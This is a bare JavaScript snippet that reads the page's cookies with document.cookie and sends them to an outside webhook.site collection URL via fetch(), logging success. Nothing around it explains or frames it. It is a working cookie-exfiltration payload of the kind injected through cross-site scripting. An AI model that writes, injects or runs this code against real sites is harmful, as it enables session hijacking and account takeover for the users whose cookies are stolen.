fetch('https://webhook.site/15b72c19-4d76-46b2-8bbc-ae2acb6c3ff3/?cookie=' + encodeURIComponent(document.cookie))
    .then(response => response.text())
    .then(data => console.log("Cookies sent successfully:", data))
    .catch(error => console.error("Error sending cookies:", error));
